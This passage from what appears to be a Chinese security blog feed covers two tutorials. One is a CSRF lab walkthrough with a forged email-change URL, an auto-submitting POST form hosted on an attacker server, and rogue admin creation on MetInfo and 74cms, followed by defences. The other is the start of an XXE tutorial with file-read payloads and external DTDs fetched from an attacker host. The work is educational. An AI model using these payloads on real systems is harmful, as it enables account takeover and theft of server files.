href="http://www.xx.com上注册了一个账号，然后修改了一下自己的个人信息（比如email地址），他发现修改的请求是：`http://www.xxx.com/edit.php?email=xiaohei@qq.com&amp;Change=Change`">www.xx.com上注册了一个账号，然后修改了一下自己的个人信息（比如email地址），他发现修改的请求是：`http://www.xxx.com/edit.php?email=xiaohei@qq.com&amp;Change=Change`</a></p><p>然后，他进行了这样一个操作：把这个链接伪装一下，在小明登录xxx网站后，欺骗他进行点击，小明点击这个链接后，个人信息就被修改了，小黑就完成了攻击目的。</p><p>这种恶意的网址可以有很多种形式，藏身于网页中的许多地方。此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。</p><p>通过例子能够看出，攻击者并不能通过CSRF攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户的浏览器，让其以用户的名义运行操作。</p><p>CSRF的攻击过程需要满足以下两个条件：</p><ol><li><p>目标用户已经登录了网站，能够执行网站的功能。</p></li><li><p>目标用户访问了攻击者构造的URL。</p></li></ol><h5 id="4、常见的攻击类型："><a href="#4、常见的攻击类型：" class="headerlink" title="4、常见的攻击类型："></a>4、常见的攻击类型：</h5><p>CSRF原理很简单，一般来说，常见的攻击类型有以下2 种：</p><ul><li><p>GET型</p></li><li><p>POST型</p></li></ul><p>下面就以pikachu靶场为例，演示下这几种类型的攻击流程。<a href="https://github.com/zhuifengshaonianhanlu/pikachu">靶场下载</a></p><h6 id="4-1、GET类型的CSRF："><a href="#4-1、GET类型的CSRF：" class="headerlink" title="4.1、GET类型的CSRF："></a>4.1、GET类型的CSRF：</h6><p>GET类型的CSRF利用很简单，只需要构造一个HTTP请求就可以完成。</p><p><strong>示例</strong>：</p><p>某网站的个人信息页面如下：<br><img src="https://img-blog.csdnimg.cn/20210127001030791.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>修改个人信息并抓包：<br><img src="https://img-blog.csdnimg.cn/20210127001519911.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> 从提交的请求可以看到，系统并没有对用户设置 Token，而且是通过GET请求来提交修改信息。那么我们拿到这个URL之后，就可以改成自己想要修改的数据，如把受害者的邮箱修改为自己的邮箱：</p><pre><code class="java">www.xx.com/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=boy&amp;phonenum=13676767767&amp;add=nba+76&amp;email=hacker%40pikachu.com&amp;submit=submit</code></pre><p>然后通过各种手段让已经登录的用户访问这个链接，攻击就完成了。</p><p>当受害者点击链接后，可以看到受害者的邮箱地址已经变成我们自己设置的了，如图：<br><img src="https://img-blog.csdnimg.cn/20210127004957387.png" alt="在这里插入图片描述"><br>当然，直接访问上面这个链接太可疑了，因此可以利用短链接生成器进行伪装，例：<br><img src="https://img-blog.csdnimg.cn/20210129150032143.png" alt="在这里插入图片描述"><br>访问生成的短链接同样执行成功。<br><img src="https://img-blog.csdnimg.cn/20210129151110921.png" alt="在这里插入图片描述"></p><p>常用短链接网站：</p><p><a href="http://tool.chinaz.com/tools/dwz.aspx">http://tool.chinaz.com/tools/dwz.aspx</a><br><a href="https://www.985.so/">https://www.985.so/</a></p><h6 id="4-2、POST类型的CSRF："><a href="#4-2、POST类型的CSRF：" class="headerlink" title="4.2、POST类型的CSRF："></a>4.2、POST类型的CSRF：</h6><p><img src="https://img-blog.csdnimg.cn/20210127160044313.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>还是和上面一样，修改个人信息，抓包：<br><img src="https://img-blog.csdnimg.cn/20210127003927793.png" alt="在这里插入图片描述"><br>可以看到是POST类型，参数是在请求体中提交的，我们就不能通过伪造URL的方式进行攻击了。</p><p>这种类型的 CSRF 利用起来通常使用的是一个自动提交的表单；攻击者可以在自己的公网服务器上搭建一个站点，在站点上做一个表单，诱导受害者点击这个链接，当用户点击时，就会自动向存在CSRF的服务器提交POST请求修改个人信息。</p><p>编写一个html 页面，代码如下，然后把此页面放到攻击者自己的Web服务器上（这里为了演示方便，放在虚拟机上了）</p><p>post.html：</p><pre><code class="html">&lt;html&gt;&lt;head&gt;&lt;script&gt;window.onload = function() &#123;  document.getElementById(&quot;postsubmit&quot;).click();&#125;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;form method=&quot;post&quot; action=&quot;http://127.0.0.1/pikachu/vul/csrf/csrfpost/csrf_post_edit.php&quot;&gt;    &lt;input id=&quot;sex&quot; type=&quot;text&quot; name=&quot;sex&quot; value=&quot;boy&quot; /&gt;    &lt;input id=&quot;phonenum&quot; type=&quot;text&quot; name=&quot;phonenum&quot; value=&quot;1367676776&quot; /&gt;    &lt;input id=&quot;add&quot; type=&quot;text&quot; name=&quot;add&quot; value=&quot;nab 76&quot; /&gt;    &lt;input id=&quot;email&quot; type=&quot;text&quot; name=&quot;email&quot; value=&quot;hacker@pikachu.com&quot; /&gt;    &lt;input id=&quot;postsubmit&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><blockquote><p>目标服务器：127.0.0.1</p></blockquote><blockquote><p>攻击者服务器：192.168.50.130</p></blockquote><p>把上面的构建好的页面放在kali上的<code>var/www/html</code>目录下（别忘开启apache服务），访问链接为：</p><pre><code class="java">http://192.168.50.130/post.html</code></pre><p>然后把该URL发送给受害者，只要受害者一点击这个链接，就会自动发送POST请求，修改其邮箱地址。</p><p>点击链接是这个页面，然后会自动提交数据。<br><img src="https://img-blog.csdnimg.cn/20210127164455212.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210127164640136.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>修改成功。（￣︶￣）↗　</p><h4 id="0x02-CSRF漏洞检测："><a href="#0x02-CSRF漏洞检测：" class="headerlink" title="0x02 CSRF漏洞检测："></a>0x02 CSRF漏洞检测：</h4><h5 id="1、手动测试："><a href="#1、手动测试：" class="headerlink" title="1、手动测试："></a>1、手动测试：</h5><p>常用的办法是：寻找站内增删改的地方，抓取一个正常请求的数据包，修改链接或表单的参数，再用验证过的游览器打开链接或提交表单，如果操作可以成功执行就代表存在CSRF漏洞。</p><p>手动测试CSRF漏洞比较麻烦，因此可以选择使用工具来进行高效的检测。下面简单介绍下几个常用的CSRF检测工具。</p><h5 id="2、使用CSRF检测工具："><a href="#2、使用CSRF检测工具：" class="headerlink" title="2、使用CSRF检测工具："></a>2、使用CSRF检测工具：</h5><p>常用的CSRF检测工具有CSRFTester、Burpsuite、CSRF Request Builder等，这里介绍下前两个工具的使用方法。</p><h6 id="2-1、CSRFTester："><a href="#2-1、CSRFTester：" class="headerlink" title="2.1、CSRFTester："></a>2.1、CSRFTester：</h6><p>CSRFTester测试流程：使用代理抓取我们在浏览器中访问过的所有的连接以及表单等信息，然后在CSRFTester中修改相应的表单参数等信息，重新提交，相当于一次伪造客户端请求，如果修改后的测试请求成功被目标服务器接受，则说明存在CSRF漏洞。同理 CSRFTester也可作为攻击工具。<a href="https://wiki.owasp.org/index.php/File:CSRFTester-1.0.zip">最新下载链接</a> </p><p>使用注意事项：</p><ul><li><p>需要java环境，并更改 run.bat中的 jre路径为你自己的：<br><img src="https://img-blog.csdnimg.cn/2021012817164960.png" alt="在这里插入图片描述"></p></li><li><p>设置HTTP代理，端口为8008。</p></li></ul><p>双击 run.bat文件启动，页面如下：<br><img src="https://img-blog.csdnimg.cn/20210128171411251.png" alt="在这里插入图片描述"><br>像这样就是正常启动了。</p><p>点击Start Recording，开启CSRFTester检测工作，执行添加管理员操作，抓取到数据包：<br><img src="https://img-blog.csdnimg.cn/20210128185743636.png" alt="在这里插入图片描述"><br>修改管理员用户名（也可以在下面生成的表单中修改），点击 Generate HTML 会生成一个 HTML 测试脚本：<br><img src="https://img-blog.csdnimg.cn/20210128190538531.png" alt="在这里插入图片描述"><br>使用同一浏览器打开此文件<br><img src="https://img-blog.csdnimg.cn/20210128192204233.png" alt="在这里插入图片描述"><br>可以看到，成功添加了账号，说明网站存在CSRF漏洞。</p><h6 id="2-2、BurpSuite："><a href="#2-2、BurpSuite：" class="headerlink" title="2.2、BurpSuite："></a>2.2、BurpSuite：</h6><p>Burpsuite中 Engagement tools 的 Generate CSRF PoC 模块也可以作为CSRF的测试工具。</p><p>还是同样执行添加管理员操作，抓包，然后右键选择 Engagement tools 找到Generate CSRF PoC。<br><img src="https://img-blog.csdnimg.cn/20210128195951721.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>修改参数，生成测试表单<br><img src="https://img-blog.csdnimg.cn/20210128200615682.png" alt="在这里插入图片描述"><br>右下角的 Test in browser 是在本地测试用的（Copy HTML 可以复制下来HTML，保存到攻击者服务器，用来攻击），点击会生成一个测试链接，内容就是生成的测试页面，打开链接（这里浏览器必须开着bp的代理）：<br><img src="https://img-blog.csdnimg.cn/20210128202523130.png" alt="在这里插入图片描述"><br>点击提交按钮并在bp中放包。<br><img src="https://img-blog.csdnimg.cn/20210128202718338.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到成功执行了测试，证明存在着CSRF漏洞。</p><h4 id="0x03-CSRF漏洞利用实例："><a href="#0x03-CSRF漏洞利用实例：" class="headerlink" title="0x03 CSRF漏洞利用实例："></a>0x03 CSRF漏洞利用实例：</h4><p>说了这么多，不实际操作下还是纸上谈兵；下面就以这两个本地CMS为例，复现一下CSRF漏洞的实际利用过程。</p><h5 id="1、MetInfo-CMS："><a href="#1、MetInfo-CMS：" class="headerlink" title="1、MetInfo CMS："></a>1、MetInfo CMS：</h5><p>cms版本：MetInfo5.3.1<br>环境：phpStudy集成环境<br>cms下载：<a href="https://pan.baidu.com/s/1ZgKx3BE3hmJkflJxundYSA">https://pan.baidu.com/s/1ZgKx3BE3hmJkflJxundYSA</a> 提取码：pek6 </p><p>解压到www目录下，访问目录开始安装<br><img src="https://img-blog.csdnimg.cn/20210129135250231.png" alt="在这里插入图片描述"><br>按照提示一步一步完成配置，进入网站</p><p><img src="https://img-blog.csdnimg.cn/20210129140009856.png" alt="在这里插入图片描述"><br>访问 /网站首页/admin  进入后台管理页面，并登录，找到添加管理员模块，添加一个管理员。<br><img src="https://img-blog.csdnimg.cn/20210129141649408.png" alt="在这里插入图片描述"><br>浏览器开启代理后，使用我们的 CSRFTester工具抓取数据包<br><img src="https://img-blog.csdnimg.cn/20210129142648447.png" alt="在这里插入图片描述"><br>找到对应的请求，修改参数。这里用户名改为hacker，然后点击Generate HTML 保存表单。<br><img src="https://img-blog.csdnimg.cn/20210129143141148.png" alt="在这里插入图片描述"><br>删除多余的请求表单后，放到攻击者的服务器上，访问链接为（这里放本地了）:<code>http://127.0.0.1/Me/index.html</code></p><p>然后诱导网站管理员访问链接<br><img src="https://img-blog.csdnimg.cn/20210129151507376.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>成功添加。</p><p>使用添加的用户登录，账号：hacker 密码：admin<br><img src="https://img-blog.csdnimg.cn/20210129151725433.png" alt="在这里插入图片描述"><br>登陆成功，攻击完成</p><h5 id="2、骑士CMS："><a href="#2、骑士CMS：" class="headerlink" title="2、骑士CMS："></a>2、骑士CMS：</h5><p>cms版本：74cms_v4.1.24<br>环境：phpStudy集成环境<br>cms下载：<a href="https://pan.baidu.com/s/1U-I28J2DDTZkY1esQr9H4A">https://pan.baidu.com/s/1U-I28J2DDTZkY1esQr9H4A</a> 提取码：75sx </p><p>解压后访问 upload目录开始安装：<br><img src="https://img-blog.csdnimg.cn/20210128224243256.png" alt="在这里插入图片描述"><br>按照提示一步一步完成配置，进入网站<br><img src="https://img-blog.csdnimg.cn/20210128224501332.png" alt="在这里插入图片描述"><br>进入后台管理页面，找到添加管理员页面</p><p><img src="https://img-blog.csdnimg.cn/20210128224928503.png" alt="在这里插入图片描述"><br>使用bp抓包，使用 Generate CSRF PoC 构造攻击页面</p><p><img src="https://img-blog.csdnimg.cn/20210128225720625.png" alt="在这里插入图片描述"><br>点击 Copy HTML 保存到本地，为诱惑管理员点击，可以添加一些具有诱惑性的东西，举个例子：（忽略这个很丑的页面→_→）</p><p><img src="https://img-blog.csdnimg.cn/20210128232607651.png" alt="在这里插入图片描述"><br>然后放到攻击者的服务器上（这里就放到本地了），访问链接为：<a href="http://127.0.0.1/74/lol.html">http://127.0.0.1/74/lol.html</a><br><img src="https://img-blog.csdnimg.cn/20210129001452304.png" alt="在这里插入图片描述"><br>然后诱导管理员点开链接并提交，成功执行。</p><p>使用刚才创建的账号密码进行登录测试，账号 hacker 密码 admin<br><img src="https://img-blog.csdnimg.cn/20210129001945395.png" alt="在这里插入图片描述"><br>登录成功，攻击完成。</p><h4 id="0x04-如何防御CSRF攻击："><a href="#0x04-如何防御CSRF攻击：" class="headerlink" title="0x04 如何防御CSRF攻击："></a>0x04 如何防御CSRF攻击：</h4><p>CSRF通常从第三方网站发起，被攻击的网站无法防止攻击发生，只能通过增强网站对CSRF的防护能力来提升安全性。</p><p>在服务器端防御CSRF攻击主要有三种策略：</p><h5 id="1、验证HTTP-Referer字段："><a href="#1、验证HTTP-Referer字段：" class="headerlink" title="1、验证HTTP Referer字段："></a>1、验证HTTP Referer字段：</h5><p>Referer字段存在于 HTTP请求头中，它记录了该 HTTP请求的来源地址。正常情况下请求的 Referer 值是 请求发出所在页面的URL，当检测到 Referer 是其他网站的话，则有可能是黑客的 CSRF 攻击，拒绝该请求。</p><p>例如黑客要对银行网站实施 CSRF 攻击，他只能在他自己的服务器构造请求，当用户点击黑客的链接发送请求到银行时，该请求的 Referer 是指向黑客自己的网站，就会拒绝该请求。</p><h5 id="2、添加Token，并验证："><a href="#2、添加Token，并验证：" class="headerlink" title="2、添加Token，并验证："></a>2、添加Token，并验证：</h5><p>Token介绍：</p><ul><li>token是服务端生成的一串随机数，作为客户端进行请求的一个令牌，当第一次登录后，服务器生成一个Token并返回给客户端。</li></ul><p>Token验证：</p><ul><li>在 HTTP请求中以參数的形式添加一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，假设请求中没有token 或者 token 内容不对，则可能是 CSRF 攻击而拒绝该请求。<h5 id="3、关键请求添加验证码："><a href="#3、关键请求添加验证码：" class="headerlink" title="3、关键请求添加验证码："></a>3、关键请求添加验证码：</h5>当进行一些敏感操作时，如修改密码、添加管理员等操作，可以通过增加网站的验证手段，例如增加图形验证码或短信验证码等，只有通过验证的请求才算合法。<h4 id="最后："><a href="#最后：" class="headerlink" title="最后："></a>最后：</h4>🆗，本次的CSRF学习就到这了，本次学习 收获颇丰，继续加油！最后提醒大家，一定不要随便点别人发的链接！<hr></li></ul><p>参考文章：<br><a href="https://cloud.tencent.com/developer/article/1586164">https://cloud.tencent.com/developer/article/1586164</a><br><a href="https://www.jianshu.com/p/4152a4947cdc">https://www.jianshu.com/p/4152a4947cdc</a><br><a href="https://blog.csdn.net/kzadmxz/article/details/92076837">https://blog.csdn.net/kzadmxz/article/details/92076837</a><br><a href="https://www.cnblogs.com/54chensongxia/p/11693666.html">https://www.cnblogs.com/54chensongxia/p/11693666.html</a><br><a href="https://www.secpulse.com/archives/78792.html">https://www.secpulse.com/archives/78792.html</a><br><a href="https://shu1l.github.io/2020/04/03/csrf-lou-dong-xue-xi/">https://shu1l.github.io/2020/04/03/csrf-lou-dong-xue-xi/</a><br><a href="https://shu1l.github.io/2020/04/03/csrf-lou-dong-xue-xi/">https://shu1l.github.io/2020/04/03/csrf-lou-dong-xue-xi/</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞原理 </category>
          
          <category> CSRF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> csrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XML外部实体注入漏洞——XXE简单分析</title>
      <link href="2021/02/01/XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E2%80%94%E2%80%94XXE%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/"/>
      <url>2021/02/01/XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E2%80%94%E2%80%94XXE%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>前言：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; XXE漏洞经常出现在CTF中，一直也没有系统的学习过，今天就来总结一波。<br>[toc]</p><h3 id="一、XXE-漏洞是什么："><a href="#一、XXE-漏洞是什么：" class="headerlink" title="一、XXE 漏洞是什么："></a>一、XXE 漏洞是什么：</h3><p>XXE 漏洞全称：XML External Entity Injection，即 XML 外部实体 注入漏洞。XXE 漏洞发生在应用程序解析 XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起 Dos攻击等危害。<br><img src="https://img-blog.csdnimg.cn/20201210125006380.png" alt="在这里插入图片描述"></p><h3 id="二、XML基础知识："><a href="#二、XML基础知识：" class="headerlink" title="二、XML基础知识："></a>二、XML基础知识：</h3><p>想要了解 XXE漏洞，需要先了解一下关于 XML的基础知识。</p><h4 id="1、XML是什么？"><a href="#1、XML是什么？" class="headerlink" title="1、XML是什么？"></a>1、XML是什么？</h4><ul><li><p>XML全称：可扩展标记语言（Extensible Markup Language）。</p></li><li><p>XML是独立于软件和硬件的信息传输工具，它把数据从HTML中分离。 XML语言没有预定义的标签，需要作者定义自己的标签和自己的文档结构。</p></li><li><p>XML 被设计用来传输和存储数据，HTML 被设计用来显示数据。</p></li></ul><h4 id="2、XML文档结构："><a href="#2、XML文档结构：" class="headerlink" title="2、XML文档结构："></a>2、XML文档结构：</h4><p>XML文档结构包括：</p><ol><li><p> XML声明</p></li><li><p>DTD 文档类型定义（可选）</p></li><li><p>文档元素。</p></li></ol><p>示例代码：<br><img src="https://img-blog.csdnimg.cn/20201210135026804.png" alt="在这里插入图片描述"><br>其中 DTD (Document Type Definition）即 <strong>文档类型定义</strong> 部分 定义了XML文档的标签以及元素属性。</p><p>如上图中的DTD 就定义了XML的根元素为 note，然后根元素下面有一些子元素 (to,from,heading,body)，那么下面的文档元素就可以使用这些元素：</p><pre><code class="xml">&lt;!--文档元素--&gt;&lt;note&gt; &lt;to&gt;Dave&lt;/to&gt;&lt;from&gt;Tom&lt;/from&gt;&lt;head&gt;Reminder&lt;/head&gt;&lt;body&gt;You are a good man&lt;/body&gt; &lt;/note&gt;</code></pre><p>注：</p><ul><li><p>PCDATA：可被解析的字符数据。PCDATA 数据类型是会被解析器解析的文本。这些文本将被解析器检查 <strong>实体</strong> 以及 <strong>标记</strong>。文本中的标签会被当作标记来处理，而实体会被展开。与之对应的是CDATA</p></li><li><p>CDATA：不被解析的字符数据，CDATA 数据类型是不会被解析器解析的文本，在这些文本中的标签不会被当作标记来对 待，其中的实体也不会被展开。详细可点这 <a href="https://www.runoob.com/xml/xml-cdata.html">链接</a></p></li></ul><h5 id="DTD声明方式："><a href="#DTD声明方式：" class="headerlink" title="DTD声明方式："></a>DTD声明方式：</h5><p>其中DTD有两种构建方式，分别为内部 DTD声明和外部 DTD声明。</p><h6 id="1、内部DTD声明："><a href="#1、内部DTD声明：" class="headerlink" title="1、内部DTD声明："></a>1、内部DTD声明：</h6><p>声明格式：</p><pre><code class="xml">&lt;!DOCTYPE 根元素 [元素声明]&gt;</code></pre><p>如 上例使用就是内部 DTD声明。</p><h6 id="2、外部DTD声明："><a href="#2、外部DTD声明：" class="headerlink" title="2、外部DTD声明："></a>2、外部DTD声明：</h6><p>通过引入 dtd文件的方式进行声明（这一点和 css，javascript 很像）。</p><p> 声明格式：</p><pre><code class="xml">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</code></pre><p>例：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE note SYSTEM &quot;test.dtd&quot;&gt;  &lt;note&gt;  &lt;to&gt;H&lt;/to&gt; &lt;from&gt;E&lt;/from&gt; &lt;head&gt;L&lt;/head&gt; &lt;body&gt;LO&lt;/body&gt;  &lt;/note&gt;</code></pre><p>test.dtd：</p><pre><code class="xml">&lt;!ELEMENT to (#PCDATA)&gt;&lt;!--定义to元素为”#PCDATA”类型--&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!--定义from元素为”#PCDATA”类型--&gt;&lt;!ELEMENT head (#PCDATA)&gt;&lt;!--定义head元素为”#PCDATA”类型--&gt; &lt;!ELEMENT body (#PCDATA)&gt;&lt;!--定义body元素为”#PCDATA”类型--&gt;</code></pre><p>🆗，说完了 DTD的两种引入方式，终于到了关键人物：” 实体 “ 登场了。 </p><h5 id="实体的声明："><a href="#实体的声明：" class="headerlink" title="实体的声明："></a>实体的声明：</h5><p>实体定义在 DTD声明中，</p><p>例：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE sss [&lt;!ELEMENT sss ANY &gt;&lt;!ENTITY xxe &quot;hello&quot; &gt;]&gt;</code></pre><p>这里定义元素为 ANY 表示可以接受任何元素作为标签，这里的 <code>&quot;xxe&quot;</code> 就是我们所说的实体了（相当于一个变量），可以在XML文档元素中使用 <code>&amp;</code> 符号对实体进行引用。</p><p>例：</p><pre><code class="xml">&lt;sss&gt;&lt;user&gt;&amp;xxe;&lt;/user&gt;&lt;pass&gt;pass&lt;/pass&gt;&lt;/sss&gt;</code></pre><p>到时候输出的时候 <code>&amp;xxe;</code> 就会被 <code>hello</code> 替换。</p><h5 id="实体的分类："><a href="#实体的分类：" class="headerlink" title="实体的分类："></a>实体的分类：</h5><h6 id="1、按声明位置分（和上面的内外部引入-DTD声明不同，别弄混了）："><a href="#1、按声明位置分（和上面的内外部引入-DTD声明不同，别弄混了）：" class="headerlink" title="1、按声明位置分（和上面的内外部引入 DTD声明不同，别弄混了）："></a>1、按声明位置分（和上面的内外部引入 DTD声明不同，别弄混了）：</h6><p>实体是定义在 DTD中的，可分为 <strong>外部实体</strong> 和 <strong>内部实体</strong>，上面的例子就是内部实体，外部实体就是把实体定义在外部文件中。</p><p>例：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE sss [&lt;!ELEMENT sss ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///D:/test.dtd&quot; &gt; //引入外部dtd文件]&gt;&lt;sss&gt;    &lt;user&gt;&amp;xxe;&lt;/user&gt;    &lt;pass&gt;pass&lt;/pass&gt;&lt;/sss&gt;</code></pre><p>这样当需要更改实体的值时，只需要更改外部的 dtd 文件就行，不需要打开源码更改了（降低了耦合性），但也带来了安全漏洞。</p><p>外部实体支持http、file等协议。不同程序支持的协议不同：<br><img src="https://img-blog.csdnimg.cn/20201210161421770.png" alt="在这里插入图片描述"></p><h6 id="2、按类型分："><a href="#2、按类型分：" class="headerlink" title="2、按类型分："></a>2、按类型分：</h6><p>实体又分为通用实体和参数实体。</p><p><strong>1、通用实体</strong>：</p><ul><li>用 <code>&amp;实体名;</code>引用，在DTD 中定义（内外DTD都行），在 XML文档元素中引用。</li></ul><p>上面的例子都是通用实体。</p><p><strong>2、参数实体</strong>：</p><ul><li><p>使用 <code>% 实体名</code>(中间有空格) 在DTD中定义（内外DTD都行），并且只能在DTD中使用 <code>%实体名;</code> 引用。</p></li><li><p>在 DTD 文件中，参数实体的声明可以引用其他实体（参数实体和通用实体）。</p></li></ul><p>引入格式：</p><p><strong>内部引入</strong>：</p><pre><code class="xml">&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;</code></pre><p>例：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;&gt;&lt;!DOCTYPE Author [&lt;!ENTITY % first &quot;Hello&quot;&gt;&lt;!ENTITY % second &quot;%first;_World&quot;&gt;%second;]&gt;</code></pre><p><code>%second;</code> 会解析为：Hello_World </p><p><strong>外部引入</strong>：</p><pre><code class="xml">&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;</code></pre><p>例：</p><pre><code class="xml">&lt;!DOCTYPE a [&lt;!ENTITY % name SYSTEM &quot;file:///D:/test.dtd&quot;&gt;%name;]&gt;</code></pre><h3 id="三、如何利用XXE："><a href="#三、如何利用XXE：" class="headerlink" title="三、如何利用XXE："></a>三、如何利用XXE：</h3><p>说了这么多，终于来到了重点，正如标题 XXE名为 “<strong>外部实体注入</strong>”，也就是说时是通过引入外部实体的方式进行注入的。</p><p>我们先来看这个例子：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE s [&lt;!ELEMENT s ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///D:/test.dtd&quot; &gt; ]&gt;&lt;s&gt;    &lt;user&gt;&amp;xxe;&lt;/user&gt;    &lt;pass&gt;pass&lt;/pass&gt;&lt;/s&gt;</code></pre><p>既然能读 dtd文件，那是不是将路径换成敏感文件的路径，也能把敏感文件读出来？</p><p>例：</p><p>解析 xml 的php文件：</p><p>test.php:</p><pre><code class="php">&lt;?php    libxml_disable_entity_loader (false);    $xmlfile = file_get_contents(&#39;php://input&#39;);    $dom = new DOMDocument();    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);     $creds = simplexml_import_dom($dom);    echo $creds;?&gt;</code></pre><p>构造payload:</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE A [  &lt;!ENTITY a SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; ]&gt; &lt;A&gt;&amp;a;&lt;/A&gt;</code></pre><p><img src="https://img-blog.csdnimg.cn/2020121219041855.png" alt="在这里插入图片描述">可以看到，成功读取到了 C盘下的 <code>system.ini</code> 文件，此漏洞就是 <strong>任意文件漏洞</strong>。</p><h3 id="四、XXE漏洞常见的危害："><a href="#四、XXE漏洞常见的危害：" class="headerlink" title="四、XXE漏洞常见的危害："></a>四、XXE漏洞常见的危害：</h3><h4 id="1、任意文件读取："><a href="#1、任意文件读取：" class="headerlink" title="1、任意文件读取："></a>1、任意文件读取：</h4><p>构造任意文件读取漏洞 playload 有下面几种方法：</p><p><strong>方式一、直接通过外部实体声明</strong>：</p><p>XML内容：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE a [  &lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt; &lt;a&gt;&amp;b;&lt;/a&gt;</code></pre><p>上面的例子就是此方式，这是最简单的XXE漏洞利用。</p><p> <strong>方式二、外部实体声明 （通用实体）+ 外部 DTD文件</strong>：</p><p>XML内容：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE a SYSTEM &quot;http://XXX/test.dtd&quot;&gt;&lt;c&gt;&amp;b;&lt;/c&gt;</code></pre><blockquote><p>注意：这里的 <a href="http://xxx/test.dtd">http://XXX/test.dtd</a> 是攻击者自己服务器上的文件。</p></blockquote><p>test.dtd 内容：</p><pre><code class="php">&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</code></pre><p>示例(使用的是 xxe-labs 靶场的php环境)：<br><img src="https://img-blog.csdnimg.cn/20201212202148819.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>因为这里使用windows演示的，所以读取的是 <code>system.ini</code> 文件，可以看到成功的读取到了。</p><p> <strong>方式三、外部实体声明（参数实体） + 引入外部实体声明</strong>：</p><p>因为参数实体可以嵌套别的实体，所以产生了这种方式。</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE a[    &lt;!ENTITY % d SYSTEM &quot;http://XXX/test.dtd&quot;&gt;    %d;]&gt;&lt;c&gt;&amp;b;&lt;/c&gt;</code></pre><p>test.dtd 内容:</p><pre><code class="php">&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</code></pre><p>示例：<br><img 